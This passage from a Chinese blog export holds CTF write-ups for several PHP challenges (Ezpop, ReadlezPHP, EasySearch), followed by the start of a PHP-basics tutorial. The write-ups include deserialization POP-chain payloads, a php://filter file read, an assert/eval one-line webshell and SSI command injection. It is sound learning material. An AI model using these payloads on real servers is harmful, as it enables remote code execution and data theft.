funct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test2(); # 这里调 __call</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化func</span><br><span class="line">    public $mod2; # 无它什么事</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new func();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($test2, $arr)</span><br><span class="line">    &#123;</span><br><span class="line">        $s1 = $this-&gt;mod1;</span><br><span class="line">        $s1(); # 这里触发 __invoke</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化string1</span><br><span class="line">    public $mod2; # __invoke对其附值，其实是为了调 __toString</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new string1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1; # 这里若拼接则会触发 __toString</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">    public $str1; # 实例化 GetFlag</span><br><span class="line">    public $str2;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1 = new GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1-&gt;get_flag(); #调用此处即可getflag，难点：需调用 __toString</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;flag:&quot; . &quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$payload = new start_gg();</span><br><span class="line">echo urlencode(serialize($payload));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211221621.png" alt="image-20210908211221621"></p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211251456.png" alt="image-20210908211251456"></p><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>知识点：php反序列化构造pop链</p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">  protected $var;</span><br><span class="line">  public function append($value)&#123;</span><br><span class="line">    include($value);</span><br><span class="line">  &#125;</span><br><span class="line">  public function __invoke()&#123;</span><br><span class="line">    $this-&gt;append($this-&gt;var);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">  public $source;</span><br><span class="line">  public $str;</span><br><span class="line">  public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  public function __toString()&#123;</span><br><span class="line">    return $this-&gt;str-&gt;source;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __wakeup()&#123;</span><br><span class="line">    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">      echo &quot;hacker&quot;;</span><br><span class="line">      $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">  public $p;</span><br><span class="line">  public function __construct()&#123;</span><br><span class="line">    $this-&gt;p = array();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __get($key)&#123;</span><br><span class="line">    $function = $this-&gt;p;</span><br><span class="line">    return $function();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">  @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  $a=new Show;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据以上代码，当用get方法传一个pop参数后，会自动调用Show类的<code>_wakeup()</code>魔术方法。<br><code>_wakeup()</code>通过preg_match()将$this-&gt;source做字符串比较，如果$this-&gt;source是Show类，就调用了<code>__toString()</code>方法；如果<code>__toString()</code>其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的<code>_get()</code>方法。如果<code>_get()</code>中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的<code>_invoke()</code>方法。利用include的文件包含漏洞，使用<code>_invoke()</code>读取flag.php的内容。</p><p>思路：首先反序列化一个实例化的Show($a),就会调用<code>_wakeup()</code>,其中$a会被赋值给source。所以让$a是一个实例化的Show类，这样就会调用<code>_tostring()</code>,然后让里面的$a这个Show类中的str赋值为Test()类，然后让str这个Test()类中的p赋值为Modifier()类。<br>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier&#123;</span><br><span class="line">protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str=new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hack=new Show();</span><br><span class="line">$hack-&gt;source=new Show();</span><br><span class="line">$hack-&gt;source-&gt;str-&gt;p=new Modifier();</span><br><span class="line">echo urlencode(serialize($hack));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pop=O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>最后要使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断</p></blockquote><p><img src="C:/Users/1/Desktop/image-20210908203632749.png" alt="image-20210908203632749"></p><p>参考</p><blockquote><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">https://blog.csdn.net/weixin_43952190/article/details/106016260</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/e40b94f24361">https://www.jianshu.com/p/e40b94f24361</a></p><p><a href="https://blog.csdn.net/weixin_45785288/article/details/109877324">https://blog.csdn.net/weixin_45785288/article/details/109877324</a></p></blockquote><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>考点  反序列化  </p><p>打开扫目录啥也没有  源码中发现php   发现反序列化函数 和魔法函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>简单审计后发现  可以通过<code>__destruct函数中的 echo $b($a);</code>进行利用  </p><p>具体使用assert函数 函数会将字符串当做代码执行 利用此可以传马</p><p>即给B传参为assert  a传参为一句话</p><p>exp为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = new HelloPhp();</span><br><span class="line">$test-&gt;b = &#x27;assert&#x27;;</span><br><span class="line">$test-&gt;a = &#x27;eval($_POST[mbg]);&#x27;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($test));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行后</p><p><img src="image-20210910201645407.png" alt="image-20210910201645407"></p><p>在  phpinfo中找到</p><p><img src="image-20210910202110284.png" alt="image-20210910202110284"></p><p><img src="image-20210910202139791.png" alt="image-20210910202139791"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫到index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要找 开头是<code>6d0bc1</code>的密文就能登录了  用刚学的三脚猫python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(1000000000):</span><br><span class="line">    a = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"></span><br><span class="line">    if a[0:6] == &#x27;6d0bc1&#x27;:</span><br><span class="line">        print(i)</span><br><span class="line">        print(a)</span><br></pre></td></tr></table></figure><p><img src="image-20210910203647633.png" alt="image-20210910203647633"></p><p>找一个顺眼的登上去  </p><p>抓包发现<img src="image-20210910204033587.png" alt="image-20210910204033587"></p><p>访问</p><p><img src="image-20210910204242243.png" alt="image-20210910204242243"></p><p><img src="image-20210910204327451.png" alt="image-20210910204327451"></p><p>经过查阅资料和大佬的wp</p><p>，<code>shtml</code>文件表示服务器当前开启了<strong>SSI</strong>与<strong>CGI</strong>支持，可以使用<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code>语法执行命令，<a href="https://www.cnblogs.com/yuzly/p/11226439.html">参考资料</a><br>题目中<code>username</code>被写入了<code>shtml</code>文件，所以将其值修改为：<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code>：</p><p>发包</p><p><img src="image-20210910205303154.png" alt="image-20210910205303154"></p><p>进去看看</p><p><img src="image-20210910205209777.png" alt="image-20210910205209777"></p><p>查看上个目录  之后就是  常规命令执行了</p><p><img src="image-20210910205358081.png" alt="image-20210910205358081"></p><p><img src="image-20210910205453738.png" alt="image-20210910205453738"></p><p><img src="image-20210910205518442.png" alt="image-20210910205518442"></p><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从下水道开始尝试看懂php</title>
      <link href="/2021/08/24/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/08/24/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有人明明以前看过php 过了几个月 想学反序列化了    竟然 看不明白  代码  属实铸币</p></blockquote><span id="more"></span><h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><p>2021-8-24</p><h6 id="代码标记"><a href="#代码标记" class="headerlink" title="代码标记"></a>代码标记</h6><p>在PHP历史发展中，可以使用多种标记来区分PHP脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASP标记：&lt;% php代码 %&gt;</span><br><span class="line">短标记：&lt;? Php代码 ?&gt;</span><br></pre></td></tr></table></figure><p>以上两种基本弃用，如果要使用那么需要在配置文件中开启</p><p><code>short_open_tag</code>和<code>asp_tags</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">脚本标记：&lt;script language=”php”&gt;php代码&lt;/script&gt;</span><br><span class="line">标准标记（常用）：&lt;?php php代码?&gt;</span><br></pre></td></tr></table></figure><h6 id="PHP注释"><a href="#PHP注释" class="headerlink" title="PHP注释"></a>PHP注释</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//：后面跟的所有内容都是注释</span><br><span class="line">\#：与//一样</span><br><span class="line">/**/：中间直到*/出现之前，全部都是注释</span><br></pre></td></tr></table></figure><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><h6 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h6><p>提前定义的变量，系统定义的变量，存储许多需要用到的数据（预定义变量都是数组）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$_GET：获取所有表单以get方式提交的数据</span><br><span class="line"></span><br><span class="line">$_POST：POST提交的数据都会保存在此</span><br><span class="line"></span><br><span class="line">$_REQUEST：GET和POST提交的都会保存</span><br><span class="line"></span><br><span class="line">$GLOBALS：PHP中所有的全局变量</span><br><span class="line"></span><br><span class="line">$_SERVER：服务器信息</span><br><span class="line"></span><br><span class="line">$_SESSION：session会话数据</span><br><span class="line"></span><br><span class="line">$_COOKIE：cookie会话数据</span><br><span class="line"></span><br><span class="line">$_ENV：环境信息</span><br><span class="line"></span><br><span class="line">$_FILES：用户上传的文件信息</span><br></pre></td></tr></table></figure><h6 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h6><p>如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值：在变量前面再多加一个$符号。</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824180005321.png" alt="image-20210824180005321"></p><h5 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h5><p><strong>值传递</strong>：将变量保存的值赋值一份，然后将新的值给另外一个变量保存（两个变量没有关系）</p><p><strong>引用传递</strong>：将变量保存的值所在的内存地址，传递给另外一个变量：两个变量指向同一块内存空间（两个变量是同一个值）$新变量 = &amp;$老变量;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//值传递</span><br><span class="line">$a = 10;</span><br><span class="line">$b = $a;</span><br><span class="line">$b = 5;</span><br><span class="line">echo $a,$b;</span><br><span class="line">##105</span><br><span class="line">//引用传递</span><br><span class="line">$c = 10;</span><br><span class="line">$d = &amp;$c;</span><br><span class="line">$c = 5;</span><br><span class="line">echo $c,$d;</span><br><span class="line">##55</span><br></pre></td></tr></table></figure><h5 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h5><p>常量：const/constant是一种在程序运行当中，不可改变的量（数据）<strong>一旦定义，通常数据不可改变（用户级别）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">定义形式</span><br><span class="line">define（&#x27;PI&#x27;,3.14）;//函数定义常量 define</span><br><span class="line">const PI = 3; //const关键字定义</span><br><span class="line"></span><br><span class="line">define(&#x27;-_-&#x27;,&#x27;smile&#x27;);//此类使用const会产生错误</span><br><span class="line">特殊访问函数  //echo constant(&#x27;-_-&#x27;); </span><br><span class="line">## smile</span><br></pre></td></tr></table></figure><h6 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h6><p>常用的几个系统常量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP_VERSION：PHP版本号</span><br><span class="line"></span><br><span class="line">PHP_INT_SIZE：整形大小</span><br><span class="line"></span><br><span class="line">PHP_INT_MAX：整形能表示的最大值（PHP中整形是允许出现负数：带符号）</span><br></pre></td></tr></table></figure><p>在PHP中还有一些特殊的常量，他们有双下划线开始+长两名+双下划线结束，这种常量称之为系统魔术常量：魔术常量的值通常会跟着环境变化，但是用户改变不了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__DIR__：当前被执行的脚本所在电脑的绝对路径</span><br><span class="line"></span><br><span class="line">__FILE__：当前被执行的脚本所在的电脑的绝对路径（带自己文件的名字）</span><br><span class="line"></span><br><span class="line">__LINE__：当前所属的行数</span><br><span class="line"></span><br><span class="line">__NAMESPACE__：当前所属的命名空间</span><br><span class="line"></span><br><span class="line">__CLASS__：当前所属的类</span><br><span class="line"></span><br><span class="line">__METHOD__：当前所属的方法</span><br></pre></td></tr></table></figure><p><strong>整数类型</strong></p><p>整数类型：保存整数数值（范围限制），4个字节存储数据，最大就是32位：42亿多。但是在PHP中默认是有符号类型（区分正负数）</p><p>在PHP中提供了四种整型的定义方式：十进制定义，二进制定义，八进制定义和十六进制定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = 120;     //10进制</span><br><span class="line"></span><br><span class="line">$a=0b110;    //2进制</span><br><span class="line"></span><br><span class="line">$a=0120;     //8进制</span><br><span class="line"></span><br><span class="line">$a=0x120;    //16进制</span><br></pre></td></tr></table></figure><p>PHP中不需要用户复杂的去计算，提供了很多的函数进行转换</p><figure 